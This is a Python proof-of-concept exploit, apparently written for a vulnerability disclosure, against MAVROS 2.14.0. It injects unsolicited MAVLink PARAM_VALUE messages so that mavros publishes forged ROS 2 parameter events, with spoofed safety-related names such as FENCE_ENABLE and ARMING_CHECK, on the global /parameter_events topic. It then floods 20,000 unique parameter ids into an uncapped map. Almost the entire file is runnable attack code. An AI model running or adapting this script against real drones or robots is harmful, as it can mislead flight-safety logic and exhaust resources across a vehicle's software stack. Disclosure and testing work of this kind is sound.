#!/usr/bin/env python3
"""
poc_MAVROS01_param_event_injection.py

MAVROS-01 -- PARAM_VALUE from a vehicle becomes (a) an unbounded map entry and
(b) a forged ROS 2 parameter-change event on the GLOBAL /parameter_events topic.

mavros/src/plugins/param.cpp, 2.14.0:
  :54   static constexpr const char * events = "/parameter_events";   // ABSOLUTE topic
  :426  ...start_parameter_event_publisher(false)   // rclcpp's own publisher is
                                                    // disabled; mavros posts here itself
  :447  std_event_pub = node->create_publisher<rcl_interfaces::msg::ParameterEvent>(
            PSN::events, event_qos);                // ParameterEventsQoS: reliable, depth 1000
  :344  msg.name = param_id;                        // attacker-controlled, char[16] on the wire
  :621  std_event_pub->publish(evt);                // per PARAM_VALUE, unconditionally
  :653  parameters.emplace(param_id, ...)           // no cap, no eviction

Both happen BEFORE the param_state check at :660, so no parameter pull needs to be
in progress: an unsolicited PARAM_VALUE is enough.

Two consequences:
  * every ROS 2 node using rclcpp::ParameterEventHandler is told that a parameter of
    mavros changed, with an attacker-chosen name and value, and cannot tell it from
    a real change (evt.node is mavros's own fully-qualified name);
  * one MAVLink packet fans out to every subscriber of a global topic -- so a flood
    is amplified across the whole ROS graph, not just mavros's own RSS.

BENIGN: sends only PARAM_VALUE messages. Nothing is written and nothing executed.
"""
import argparse
import os
import struct
import sys
import threading
import time

os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402

C = {"obs": "\033[0;37m", "atk": "\033[1;31m", "ok": "\033[1;32m",
     "warn": "\033[1;33m", "hdr": "\033[1;36m", "rst": "\033[0m"}
obs = lambda m: print("%s[obs]%s %s" % (C["obs"], C["rst"], m))
atk = lambda m: print("%s[atk]%s %s" % (C["atk"], C["rst"], m))
ok = lambda m: print("%s[ok]%s %s" % (C["ok"], C["rst"], m))
warn = lambda m: print("%s[!]%s  %s" % (C["warn"], C["rst"], m))


def banner(t):
    line = "=" * 71
    print("%s%s\n  %s\n%s%s" % (C["hdr"], line, t, line, C["rst"]))


SPOOF = [
    # Names a downstream node might plausibly be watching. Values are inert; the
    # point is that the NAME and VALUE are ours and the event is attributed to mavros.
    ("FENCE_ENABLE", 0.0),
    ("ARMING_CHECK", 0.0),
    ("BATT_LOW_VOLT", 0.0),
]


class Flooder:
    def __init__(self, bind):
        self.master = mavutil.mavlink_connection(
            bind, source_system=1, source_component=1, dialect="ardupilotmega")
        self.up = threading.Event()
        self._run = True

    def start(self):
        threading.Thread(target=self._hb, daemon=True).start()
        threading.Thread(target=self._rx, daemon=True).start()

    def _hb(self):
        while self._run:
            try:
                self.master.mav.heartbeat_send(
                    mavutil.mavlink.MAV_TYPE_QUADROTOR,
                    mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 0,
                    mavutil.mavlink.MAV_STATE_STANDBY)
            except Exception:
                pass
            time.sleep(1.0)

    def _rx(self):
        while self._run:
            try:
                m = self.master.recv_match(blocking=True, timeout=0.5)
            except Exception:
                time.sleep(0.1)
                continue
            if m is not None and m.get_type() == "HEARTBEAT" and not self.up.is_set():
                ok("mavros is up (sysid=%d compid=%d)"
                   % (m.get_srcSystem(), m.get_srcComponent()))
                self.up.set()

    def send_param(self, name, value, idx=0, count=65535):
        self.master.mav.param_value_send(
            name.encode()[:16], float(value),
            mavutil.mavlink.MAV_PARAM_TYPE_REAL32, count, idx)

    def stop(self):
        self._run = False


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--bind", default="udpin:0.0.0.0:14557")
    p.add_argument("--count", type=int, default=20000,
                   help="unique param_ids to inject (default 20000)")
    p.add_argument("--rate", type=int, default=0,
                   help="messages/sec, 0 = as fast as possible")
    a = p.parse_args()

    banner("MAVROS-01: PARAM_VALUE -> forged /parameter_events + unbounded map")
    warn("BENIGN: only PARAM_VALUE messages are sent.")
    obs("target: ros-jazzy-mavros 2.14.0 (shipped Debian package)")

    f = Flooder(a.bind)
    f.start()
    obs("waiting for mavros ...")
    if not f.up.wait(timeout=90):
        warn("mavros did not appear")
        return 1
    time.sleep(3.0)

    # ---- part 1: spoofed named parameters -------------------------------
    atk("part 1: injecting parameters with names a downstream node might watch.")
    atk("        each one makes mavros publish a ParameterEvent on /parameter_events")
    atk("        attributed to the mavros node itself.")
    for n, v in SPOOF:
        f.send_param(n, v)
        atk("  sent PARAM_VALUE param_id=%-16r value=%s" % (n, v))
        time.sleep(0.4)
    time.sleep(1.5)

    # ---- part 2: unbounded growth ---------------------------------------
    atk("part 2: injecting %d UNIQUE param_ids (param.cpp:653 emplace, no cap)"
        % a.count)
    t0 = time.time()
    for i in range(a.count):
        f.send_param("Z%09d" % i, float(i), idx=i % 65535)
        if a.rate:
            time.sleep(1.0 / a.rate)
        if i and i % 5000 == 0:
            obs("  ... %d sent (%.1fs)" % (i, time.time() - t0))
    dt = time.time() - t0
    ok("sent %d unique param_ids in %.1fs (%.0f msg/s)" % (a.count, dt, a.count / dt))
    time.sleep(4.0)
    f.stop()
    return 0


if __name__ == "__main__":
    sys.exit(main())
